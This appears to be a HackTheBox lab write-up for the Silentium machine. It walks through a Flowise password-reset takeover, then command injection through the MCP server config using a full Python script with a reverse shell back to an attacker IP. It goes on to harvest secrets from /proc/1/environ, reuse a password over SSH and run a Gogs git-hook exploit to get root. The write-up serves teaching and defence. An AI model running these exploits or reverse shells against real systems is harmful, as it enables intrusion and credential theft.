# Silentium — HackTheBox Writeup

**Difficulty:** Easy
**OS:** Linux
**Target IP:** 10.129.xx.xx
**Attacker (VPN) IP:** 10.10.xx.xx

---

## 1. Reconnaissance

### 1.1 Nmap Scan

Start with a standard service/version scan against the target.

```bash
nmap -sV -sC 10.129.xx.xx
```

Output:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-12 04:29 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.48s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 [redacted] (ECDSA)
|_  256 [redacted] (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**What this tells us:** Only two ports are open — SSH (22) and HTTP (80). The HTTP service redirects to a virtual host name (`silentium.htb`), which means the web server is using name-based virtual hosting and won't serve anything useful if we browse straight to the IP. We need to add that hostname to our local DNS resolution (`/etc/hosts`) so our browser/tools send the correct `Host` header.

### 1.2 Adding the Host Entry

```bash
cat /etc/hosts
```

```
10.129.xx.xx    silentium.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Now `http://silentium.htb` resolves and loads properly in the browser.

### 1.3 Subdomain Fuzzing (Virtual Host Discovery)

Since the site uses vhosts, there could be more subdomains hiding on the same IP that aren't linked anywhere on the main page. We fuzz for them using `ffuf`, sending different `Host` headers and watching for responses that differ from the "default" (unmatched) vhost response.

```bash
ffuf -u http://silentium.htb -H "Host:FUZZ.silentium.htb" \
  -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 6
```

- `-H "Host:FUZZ.silentium.htb"` — injects the wordlist word into the `Host` header instead of the URL, which is how vhost fuzzing is done.
- `-fw 6` — filters out responses with a word count of 6, which is the size of the "no such vhost" default response, so only real matches show up.

Result:

```
staging                 [Status: 200, Size: 3142, Words: 789, Lines: 70, Duration: 407ms]
:: Progress: [5000/5000] :: Job [1/1] :: 162 req/sec :: Duration: [0:00:28] :: Errors: 0 ::
```

We found `staging.silentium.htb`. Add it to `/etc/hosts` as well:

```
10.129.xx.xx    silentium.htb staging.silentium.htb
```

---

## 2. Staging Subdomain — Flowise AI

Browsing to `staging.silentium.htb` reveals a **Flowise** instance (a low-code/no-code builder for LLM/AI workflow apps). We confirm the exact version through its API, since exploits are usually version-specific:

```bash
curl http://staging.silentium.htb/api/v1/version
```

```json
{"version":"3.0.5"}
```

Flowise **v3.0.5** is the target version. A quick search for public vulnerabilities affecting this version turns up:

> **CVE-2025-58434** — Unauthenticated Password Reset / Account Takeover in Flowise

This means anyone, without any prior login, can trigger a password reset for an existing account and take it over — as long as they know (or can guess) a valid email address tied to an account.

### 2.1 Finding a Valid Username/Email

Browsing the main site `http://silentium.htb` (the "public" facing page) exposed some usernames/email addresses in its content (e.g., team/contact info). One of these was `ben@silentium.htb`, which we use as our target account for the password reset abuse.

### 2.2 Exploiting the Unauthenticated Password Reset (CVE-2025-58434)

**Step 1 — Trigger the "forgot password" flow:**

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/forgot-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Response:

```json
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"[redacted bcrypt hash]","tempToken":"[redacted token]","tokenExpiry":"2026-04-12T05:02:00.899Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-12T04:47:00.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

**This is the core of the vulnerability.** A properly designed "forgot password" endpoint should only email the reset token/link to the account owner — it should **never** return the `tempToken` (the secret needed to actually reset the password) directly in the HTTP response. Here, the vulnerable Flowise version leaks that token straight back to whoever made the request, meaning **no email access or authentication is required at all** to reset any user's password.

**Step 2 — Use the leaked `tempToken` to set a new password:**

```bash
curl -s -X POST 'http://staging.silentium.htb/api/v1/account/reset-password' \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"[redacted token]","password":"[REDACTED-PASSWORD]"}}'
```

Response:

```json
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"[redacted bcrypt hash]","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-04-12T04:47:32.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}
```

The password field is now blank and `tempToken` has been cleared, which confirms the reset succeeded. We now hold valid credentials for the `ben@silentium.htb` (admin) account on the Flowise instance.

---

## 3. From Flowise Admin to Remote Code Execution

Flowise lets admins configure "Custom MCP" (Model Context Protocol) tool servers — essentially, the app can be told to launch an external command/process as a "tool" for an AI agent to use. If the app doesn't sanitize the command configuration it accepts, an authenticated admin can supply arbitrary OS commands to be executed by the server itself. This is effectively **authenticated command injection via the MCP server config**.

### 3.1 Exploit Script

A Python script logs into Flowise with the recovered admin credentials, then calls the internal `customMCP` "listActions" endpoint with a crafted `mcpServerConfig` that tells Flowise to run `sh -c "<our command>"` instead of a legitimate MCP tool binary.

```python
import requests
import json

s = requests.Session()

# Login
s.post('http://staging.silentium.htb/api/v1/auth/login',
    json={'email': 'ben@silentium.htb', 'password': '[REDACTED-PASSWORD]'},
    headers={'x-request-from': 'internal'})

# RCE function
def rce(cmd):
    mcp_config = json.dumps({"command": "sh", "args": ["-c", cmd]})
    try:
        s.post('http://staging.silentium.htb/api/v1/node-load-method/customMCP',
            json={
                "loadMethod": "listActions",
                "inputs": {"mcpServerConfig": mcp_config}
            },
            headers={'x-request-from': 'internal'},
            timeout=15)
    except:
        pass

rce("python3 -c 'import socket,subprocess,os;"
    "s=socket.socket();s.connect((\"10.10.xx.xx\",9001));"
    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
    "subprocess.call([\"/bin/sh\",\"-i\"])'")
```

**What's happening here:**
- We log in first, since the vulnerable endpoint still requires a valid session — this is why the account takeover in step 2 was a necessary prerequisite.
- The `x-request-from: internal` header is set because the Flowise API restricts certain internal-only endpoints based on this header; setting it ourselves lets us reach the vulnerable code path.
- `mcpServerConfig` is meant to describe how to launch a legitimate MCP tool binary (a `command` plus `args`), but Flowise passes these values straight to a shell process without validation — so we replace the intended binary with `sh -c "<reverse shell payload>"`.
- The payload itself is a standard Python reverse-shell one-liner that connects back to our attacking machine on port 9001 and spawns an interactive shell.

### 3.2 Catching the Shell

Start a listener before running the exploit:

```bash
penelope -p 9001
```

```
[+] Listening for reverse shells on 0.0.0.0:9001 →  127.0.0.1 • 192.168.1.64 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
```

Run the exploit script (`python3 mcp.py`), and the shell lands:

```
[+] Got reverse shell from c78c3cceb7ba~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
/ # id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

We land as `root`, **but** the hostname (`c78c3cceb7ba`) and limited process list indicate this is a **Docker container** running the Flowise app, not the actual target host. Being "root" here is only root *inside the container* — we still need to escape/pivot to the real machine.

---

## 4. Pivoting Out of the Container — Credential Harvesting

A very common way containerized apps store secrets is through environment variables (commonly injected at container start via `docker run -e` or a compose file). Process 1 (PID 1) inside a container is normally the entrypoint process, so reading its environment often reveals the secrets that were passed in when the container launched.

```bash
cat /proc/1/environ | tr '\0' '\n'
```

```
FLOWISE_PASSWORD=[REDACTED]
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=1
PORT=3000
HOME=/root
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=[REDACTED]
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=[REDACTED]
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=[REDACTED]
SMTP_USER=test
```

This dump gives us **two candidate passwords** tied to the `ben` username: `FLOWISE_PASSWORD` and `SMTP_PASSWORD`. Since the SSH service on the real host also has a `ben` mention floating around (and `SENDER_EMAIL=ben@silentium.htb`), it's worth testing whether either of these passwords has been **reused** for the actual Linux user account `ben` on the host system, outside the container.

### 4.1 Checking for Password Reuse (Proof of Testing)

We test the `SMTP_PASSWORD` value against SSH on the real target IP:

```bash
ssh ben@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:[redacted]
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:385: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
ben@10.129.xx.xx's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
...
ben@silentium:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben),100(users)
```

**It worked.** This confirms the `SMTP_PASSWORD` environment variable value found inside the Docker container was reused as `ben`'s actual login password on the host. This is a classic real-world mistake: a secret meant for one purpose (authenticating to an SMTP relay for sending emails) gets reused verbatim as a login password elsewhere, so leaking it in one context (the container's environment) compromises an entirely different system (SSH on the host). The `FLOWISE_PASSWORD` variable, by contrast, was *not* tested successfully here since `SMTP_PASSWORD` already succeeded first.

### 4.2 User Flag

```bash
cat user.txt
```

```
[REDACTED USER FLAG]
```

---

## 5. Host Enumeration — Finding Gogs

Now logged in as `ben` on the actual host (not the container), we look for other locally-bound services that aren't exposed externally, since these are common privilege-escalation/pivot targets:

```bash
ss -tulnp
```

```
Netid          State           Recv-Q          Send-Q                    Local Address:Port                      Peer Address:Port          Process
udp            UNCONN          0               0                            127.0.0.54:53                             0.0.0.0:*
udp            UNCONN          0               0                         127.0.0.53%lo:53                             0.0.0.0:*
udp            UNCONN          0               0                               0.0.0.0:68                             0.0.0.0:*
tcp            LISTEN          0               4096                          127.0.0.1:46707                          0.0.0.0:*
tcp            LISTEN          0               4096                          127.0.0.1:8025                           0.0.0.0:*
tcp            LISTEN          0               4096                         127.0.0.54:53                             0.0.0.0:*
tcp            LISTEN          0               4096                          127.0.0.1:1025                           0.0.0.0:*
tcp            LISTEN          0               4096                      127.0.0.53%lo:53                             0.0.0.0:*
tcp            LISTEN          0               4096                          127.0.0.1:3000                           0.0.0.0:*
tcp            LISTEN          0               4096                          127.0.0.1:3001                           0.0.0.0:*
tcp            LISTEN          0               511                             0.0.0.0:80                             0.0.0.0:*
tcp            LISTEN          0               4096                            0.0.0.0:22                             0.0.0.0:*
tcp            LISTEN          0               511                                [::]:80                                [::]:*
tcp            LISTEN          0               4096                               [::]:22                                [::]:*
```

Port `3001` (bound only to localhost, meaning it's not reachable directly from outside the box) looks interesting. Note: port 8025 is MailHog's web UI (matching the `SMTP_HOST=mailhog` we saw earlier), and 1025 is its SMTP listener — consistent with the credentials found in the container.

We curl the local service on 3001 from inside our SSH session:

```bash
curl -i http://localhost:3001
```

```
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
Set-Cookie: i_like_gogs=[redacted]; Path=/; HttpOnly
Set-Cookie: _csrf=[redacted]; Path=/; Domain=staging-v2-code.dev.silentium.htb; Expires=Mon, 13 Apr 2026 04:56:35 GMT; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: deny
...
```

The `i_like_gogs` cookie name is a giveaway — this is **Gogs**, a lightweight self-hosted Git service (similar to GitLab/Gitea but much simpler). The `Set-Cookie` domain also leaks a **new vhost name** we didn't know about yet: `staging-v2-code.dev.silentium.htb`.

We add this to `/etc/hosts`:

```
10.129.xx.xx    silentium.htb staging.silentium.htb staging-v2-code.dev.silentium.htb
```

Since it's bound to `127.0.0.1:3001` on the host but has a public-facing vhost name configured, it's likely reverse-proxied through nginx on port 80 using that hostname — so we can reach it normally through the browser/tools once the vhost is resolvable.

---

## 6. Gogs — Authenticated RCE (CVE-2025-8110)

### 6.1 Registering an Account and Getting an API Token

Gogs typically allows open self-registration by default. We create an account through the web UI (or its API), then generate a personal access token from the account settings — this token is required by the exploit script to authenticate API calls.

### 6.2 The Vulnerability

> **CVE-2025-8110** — Authenticated Remote Code Execution in Gogs v0.13.3

This vulnerability abuses Gogs' Git hook mechanism combined with unsafe handling of symlinked files inside a repository. In short: an authenticated user can push a specially crafted repository containing a **symlink** pointing to a server-side Git hook file, then push again to overwrite that hook's *target* (via the symlink) with attacker-controlled shell code. When Gogs internally processes the push (which triggers Git hooks server-side), the malicious hook executes on the server with the Gogs service's privileges.

**Public exploit reference:**
`https://github.com/manbahadurthapa1248/CVE-2025-8110-Authenticated-Remote-Code-Execution-on-Gogs-v0.13.3-`

### 6.3 Running the Exploit

Start a listener for the reverse shell:

```bash
penelope -p 4444
```

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.64 • 172.17.0.1 • 172.18.0.1 • 10.10.xx.xx
```

Run the public exploit script against the Gogs vhost, using our registered account's email, password, and API token:

```bash
python3 gogs_rce.py -t http://staging-v2-code.dev.silentium.htb \
  -l 10.10.xx.xx -lp 4444 \
  -e hello@test.com -p [REDACTED-PASSWORD] \
  -a [REDACTED-API-TOKEN]
```

Output:

```
[*] Target: http://staging-v2-code.dev.silentium.htb
[*] Identifying internal username from email...
[+] Authenticated as: hello (hello@test.com)
[*] Creating repository: pwn_rev_1775970279
[*] Initializing local repo and pushing symlink...
[master (root-commit) 49428b8] link creation
 1 file changed, 1 insertion(+)
 create mode 120000 evil.link
[*] Fetching SHA and overwriting hook with reverse shell...
[*] TRIGGERING: Check your listener on 4444...
[master d027fb0] trigger rce
 1 file changed, 1 insertion(+)
 create mode 100644 trigger.txt
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 4 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 272 bytes | 272.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
[+] Push timed out (this is normal when reverse shell is active).

[+] Done.
```

**Step-by-step of what the script does under the hood:**
1. Logs into Gogs with the provided credentials/API token and resolves the internal username tied to the given email.
2. Creates a brand-new empty repository to work in.
3. Pushes a first commit that contains a **symlink** (`evil.link`) pointing at a sensitive server-side file (the repository's Git hook script, e.g. `post-receive`).
4. Fetches that file's current SHA/content via the symlink, then pushes a second commit that **overwrites the hook's real file contents** with a reverse-shell payload, using the symlink as a path traversal / write primitive.
5. Because Gogs executes hook scripts server-side whenever a push happens, the moment the hook file is overwritten and the next push event fires, the malicious hook code runs on the Gogs server itself — giving us a reverse shell back to our listener.

### 6.4 Catching the Root Shell

```
[+] Got reverse shell from silentium~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to deploy Python Agent...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
root@silentium:~/gogs-repositories/hello/pwn_1775970064.git# id
uid=0(root) gid=0(root) groups=0(root)
```

This time, the hostname (`silentium`) confirms we are on the **real host**, not a container, and Gogs was running as `root` — so this immediately gives full root on the box.

### 6.5 Root Flag

```bash
cat root.txt
```

```
[REDACTED ROOT FLAG]
```

---

## 7. Summary — Step by Step

1. **Nmap scan** revealed only SSH (22) and HTTP (80) open, with HTTP redirecting to the vhost `silentium.htb`.
2. Added `silentium.htb` to `/etc/hosts` to resolve the vhost locally.
3. **Vhost fuzzing with `ffuf`** (filtering on word count) discovered a hidden subdomain: `staging.silentium.htb`.
4. Browsing to the staging subdomain revealed a **Flowise** AI workflow builder; querying its `/api/v1/version` endpoint confirmed version **3.0.5**.
5. Found a candidate username/email (`ben@silentium.htb`) leaked on the main public site.
6. Exploited **CVE-2025-58434** (unauthenticated Flowise password reset/account takeover):
   - Called `/forgot-password` with the target email — the vulnerable API leaked the secret `tempToken` directly in the JSON response instead of only emailing it.
   - Used that leaked token against `/reset-password` to set a brand-new password for the `ben` (admin) account, without ever needing access to his real inbox.
7. Logged into Flowise as admin with the new password, then abused the **Custom MCP server config** feature to inject an arbitrary shell command (`sh -c "<payload>"`) instead of a legitimate MCP tool binary, achieving **RCE inside the Flowise Docker container** as root (container-root, not host-root).
8. Since Docker containers commonly leak secrets via environment variables, read `/proc/1/environ` and harvested several credentials, including `FLOWISE_PASSWORD` and `SMTP_PASSWORD`, both tied to the username `ben`.
9. **Tested for password reuse**: tried the `SMTP_PASSWORD` value against the real host's SSH service as user `ben` — it worked, confirming the SMTP credential had been reused as the actual Linux login password. This got us a real shell on the **host machine** (not the container) and the **user flag**.
10. Enumerated local-only listening ports (`ss -tulnp`) on the host and found an internal service on `127.0.0.1:3001`.
11. Fingerprinted it via HTTP response headers/cookies (`i_like_gogs` cookie) as a **Gogs** git server, and discovered yet another hidden vhost from the response's cookie domain: `staging-v2-code.dev.silentium.htb`.
12. Registered a Gogs account and generated a personal API token.
13. Exploited **CVE-2025-8110** (authenticated RCE in Gogs v0.13.3) using a public exploit script that abuses a malicious symlink pushed into a repo to overwrite a server-side Git hook with a reverse-shell payload, triggered automatically on the next push.
14. Caught the resulting reverse shell — this time landing directly as **root on the real host**, since Gogs itself ran with root privileges, yielding the **root flag**.

### Key Takeaways / Lessons

- **Vhost enumeration matters**: two of the three "hidden" services on this box (`staging.silentium.htb` and `staging-v2-code.dev.silentium.htb`) were never linked anywhere and only discoverable through subdomain fuzzing or cookie/header leakage.
- **Sensitive tokens must never appear in API responses** — the Flowise password-reset flow should only ever send the reset token via email, never echo it back over HTTP.
- **Environment variables inside containers are a goldmine** for attackers once code execution is achieved, and organizations should avoid **reusing the same secret across unrelated services** (e.g., an SMTP relay password should never double as a Unix login password) — this single instance of password reuse was the pivot point from "container root" to "real host user."
- **Keeping software patched matters**: both major footholds (Flowise 3.0.5 and Gogs 0.13.3) were exploitable purely because of known, publicly disclosed CVEs with public exploit code already available.
